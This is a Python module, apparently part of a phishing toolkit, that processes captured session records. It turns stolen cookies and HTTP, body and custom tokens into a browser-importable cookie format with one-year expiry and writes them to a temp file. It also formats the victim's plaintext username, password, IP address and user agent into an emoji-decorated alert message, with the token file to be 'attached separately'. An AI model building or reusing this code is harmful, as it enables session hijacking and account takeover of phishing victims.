"""
Session Processor - Processes session data and creates token files
Same logic as Go application's createTxtFile and formatSessionMessage
"""

import json
import os
import tempfile
import random
import string
from datetime import datetime
from typing import Dict, Optional

def generate_random_string(length: int = 10) -> str:
    """Generate random string for file names"""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def process_all_tokens(session_tokens: str, http_tokens: str, body_tokens: str, custom_tokens: str) -> list:
    """
    Process and extract tokens from all token types.
    Handles both nested cookie structures and flat token structures (body/http tokens).
    """
    consolidated_tokens = []
    
    # Process cookie tokens (nested structure: domain -> cookie_name -> cookie_data)
    if session_tokens and session_tokens != "null" and session_tokens.strip() != "null":
        try:
            raw_tokens = json.loads(session_tokens)
            if raw_tokens and isinstance(raw_tokens, dict):
                tokens = extract_tokens(raw_tokens, token_type="cookie")
                consolidated_tokens.extend(tokens)
        except (json.JSONDecodeError, Exception) as e:
            print(f"Warning: error parsing session tokens: {e}")
    
    # Process HTTP tokens (flat structure: token_name -> token_value)
    if http_tokens and http_tokens != "null" and http_tokens.strip() != "null":
        try:
            raw_tokens = json.loads(http_tokens)
            if raw_tokens and isinstance(raw_tokens, dict):
                tokens = extract_flat_tokens(raw_tokens, token_type="http")
                consolidated_tokens.extend(tokens)
        except (json.JSONDecodeError, Exception) as e:
            print(f"Warning: error parsing http tokens: {e}")
    
    # Process body tokens (flat structure: token_name -> token_value)
    if body_tokens and body_tokens != "null" and body_tokens.strip() != "null":
        try:
            raw_tokens = json.loads(body_tokens)
            if raw_tokens and isinstance(raw_tokens, dict):
                tokens = extract_flat_tokens(raw_tokens, token_type="body")
                consolidated_tokens.extend(tokens)
        except (json.JSONDecodeError, Exception) as e:
            print(f"Warning: error parsing body tokens: {e}")
    
    # Process custom tokens (can be nested or flat, try both)
    if custom_tokens and custom_tokens != "null" and custom_tokens.strip() != "null":
        try:
            raw_tokens = json.loads(custom_tokens)
            if raw_tokens and isinstance(raw_tokens, dict):
                # Try nested structure first (cookie-like)
                tokens = extract_tokens(raw_tokens, token_type="custom")
                if not tokens:
                    # If no tokens extracted, try flat structure
                    tokens = extract_flat_tokens(raw_tokens, token_type="custom")
                consolidated_tokens.extend(tokens)
        except (json.JSONDecodeError, Exception) as e:
            print(f"Warning: error parsing custom tokens: {e}")
    
    return consolidated_tokens

def extract_flat_tokens(input_data: Dict, token_type: str = "token") -> list:
    """
    Extract tokens from flat dictionary structure (token_name -> token_value).
    Used for body_tokens and http_tokens which are stored as flat maps.
    """
    tokens = []
    
    for token_name, token_value in input_data.items():
        # Skip if value is not a string (shouldn't happen, but be safe)
        if not isinstance(token_value, str):
            token_value = str(token_value) if token_value is not None else ""
        
        # Create token object in cookie format for compatibility
        token = {
            "name": token_name,
            "value": token_value,
            "domain": "",  # Flat tokens don't have domain
            "hostOnly": True,  # Default for tokens
            "path": "/",  # Default path
            "secure": True,  # Tokens are typically secure
            "httpOnly": False,  # Tokens are usually accessible via JS
            "sameSite": "",
            "session": False,
            "firstPartyDomain": "",
            "partitionKey": None,
            "storeId": None,
            "tokenType": token_type,  # Mark the token type for reference
        }
        
        # Set expiration date (1 year from now)
        exp = int(datetime.now().timestamp()) + (365 * 24 * 60 * 60)
        token["expirationDate"] = exp
        
        tokens.append(token)
    
    return tokens

def extract_tokens(input_data: Dict, token_type: str = "cookie") -> list:
    """
    Extract tokens from nested dictionary structure (domain -> cookie_name -> cookie_data).
    EXACTLY like Go's extractTokens function - extracts ALL tokens, no filtering.
    """
    tokens = []
    
    for domain, token_group in input_data.items():
        if not isinstance(token_group, dict):
            continue
        
        # Remove leading dot from domain (like Go code does)
        # Go code: if len(domain) > 0 && domain[0] == '.' { domain = domain[1:] }
        clean_domain = domain.lstrip(".") if domain else domain
        
        # Iterate through all cookies in this domain
        # Go code: for _, tokenData := range tokenGroup
        # This iterates over ALL cookies, even if they don't have Name/Value
        for token_name, token_data in token_group.items():
            if not isinstance(token_data, dict):
                continue
            
            # Initialize token with empty/default values (like Go's zero values)
            # Go code creates a new Token struct with zero values
            token = {
                "name": "",  # Zero value - will be set if Name exists
                "value": "",  # Zero value - will be set if Value exists
                "domain": clean_domain,
                "hostOnly": False,  # Zero value - will be set if HostOnly exists
                "path": "",  # Zero value - will be set if Path exists
                "secure": False,  # Zero value - will be set if Secure exists
                "httpOnly": False,  # Zero value - will be set if HttpOnly exists
                "sameSite": "",  # Zero value - will be set if SameSite exists
                "session": False,  # Zero value - will be set if Session exists
                "firstPartyDomain": "",  # Zero value - will be set if FirstPartyDomain exists
                "partitionKey": None,  # Zero value - will be set if PartitionKey exists
                "storeId": None,  # Zero value - will be set if storeId/StoreID exists
            }
            
            # Extract fields ONLY if they exist (like Go's type assertions with ok)
            # Go code: if name, ok := tokenData["Name"].(string); ok { t.Name = name }
            if "Name" in token_data and isinstance(token_data["Name"], str):
                token["name"] = token_data["Name"]
            elif token_name:  # Fallback to key if Name doesn't exist
                token["name"] = token_name
            
            # Extract Value - preserve EXACTLY as stored, no modifications
            # Handle both string and other types (convert to string if needed, but preserve all characters)
            if "Value" in token_data:
                value = token_data["Value"]
                # If it's a string, use it directly (preserves all special characters)
                if isinstance(value, str):
                    token["value"] = value
                # If it's not a string, convert but preserve all characters
                else:
                    token["value"] = str(value)
            
            if "HostOnly" in token_data and isinstance(token_data["HostOnly"], bool):
                token["hostOnly"] = token_data["HostOnly"]
            else:
                # Calculate from domain: if original domain doesn't start with ".", it's hostOnly
                token["hostOnly"] = not domain.startswith(".")
            
            if "Path" in token_data and isinstance(token_data["Path"], str):
                token["path"] = token_data["Path"]
            
            if "Secure" in token_data and isinstance(token_data["Secure"], bool):
                token["secure"] = token_data["Secure"]
            
            if "HttpOnly" in token_data and isinstance(token_data["HttpOnly"], bool):
                token["httpOnly"] = token_data["HttpOnly"]
            
            if "SameSite" in token_data and isinstance(token_data["SameSite"], str):
                token["sameSite"] = token_data["SameSite"]
            
            if "Session" in token_data and isinstance(token_data["Session"], bool):
                token["session"] = token_data["Session"]
            
            if "FirstPartyDomain" in token_data and isinstance(token_data["FirstPartyDomain"], str):
                token["firstPartyDomain"] = token_data["FirstPartyDomain"]
            
            if "PartitionKey" in token_data:
                token["partitionKey"] = token_data["PartitionKey"]
            
            # Check storeId (lowercase) first, then StoreID (uppercase)
            if "storeId" in token_data:
                token["storeId"] = token_data["storeId"]
            elif "StoreID" in token_data:
                token["storeId"] = token_data["StoreID"]
            
            # Special handling for __Host- and __Secure- cookies
            # These cookies MUST have secure=true and hostOnly=true (browser requirement)
            cookie_name = token["name"]
            if cookie_name.startswith("__Host-") or cookie_name.startswith("__Secure-"):
                token["hostOnly"] = True
                token["secure"] = True
                # __Host- cookies also require path="/"
                if cookie_name.startswith("__Host-"):
                    token["path"] = "/"
            
            # Set expiration date (1 year from now) - Go always sets this
            exp = int(datetime.now().timestamp()) + (365 * 24 * 60 * 60)
            token["expirationDate"] = exp
            
            # Add token type for reference
            token["tokenType"] = token_type
            
            # ALWAYS append token - Go code always appends, no filtering
            tokens.append(token)
    
    return tokens

def create_txt_file(session_data: Dict) -> Optional[str]:
    """
    Create a text file with session tokens.
    Same logic as Go's createTxtFile function.
    """
    try:
        # Generate random filename
        txt_filename = generate_random_string() + ".txt"
        txt_filepath = os.path.join(tempfile.gettempdir(), txt_filename)
        
        # Initialize nil maps to empty maps
        tokens = session_data.get("tokens") or {}
        http_tokens = session_data.get("http_tokens") or {}
        body_tokens = session_data.get("body_tokens") or {}
        custom = session_data.get("custom") or {}
        
        # Marshal to JSON strings
        tokens_json = json.dumps(tokens, indent=2)
        http_tokens_json = json.dumps(http_tokens, indent=2)
        body_tokens_json = json.dumps(body_tokens, indent=2)
        custom_json = json.dumps(custom, indent=2)
        
        # Process all tokens
        all_tokens = process_all_tokens(tokens_json, http_tokens_json, body_tokens_json, custom_json)
        
        # Marshal final result
        result = json.dumps(all_tokens, indent=2)
        
        # Write to file
        with open(txt_filepath, 'w', encoding='utf-8') as f:
            f.write(result)
        
        return txt_filepath
        
    except Exception as e:
        print(f"Error creating TXT file: {e}")
        return None

def format_session_message(session_data: Dict) -> str:
    """
    Format session information as a message.
    Same format as Go's formatSessionMessage function.
    """
    username = session_data.get("username", "")
    password = session_data.get("password", "")
    landing_url = session_data.get("landing_url", "")
    user_agent = session_data.get("useragent", "")
    remote_addr = session_data.get("remote_addr", "")
    create_time = session_data.get("create_time", 0)
    update_time = session_data.get("update_time", 0)
    
    message = f"""✨ Session Information ✨

👤 Username:      ➖ {username}
🔑 Password:      ➖ {password}
🌐 Landing URL:   ➖ {landing_url}
 
🖥️ User Agent:    ➖ {user_agent}
🌍 Remote Address:➖ {remote_addr}
🕒 Create Time:   ➖ {create_time}
🕔 Update Time:   ➖ {update_time}

📦 Tokens are added in txt file and attached separately in message.
"""
    return message

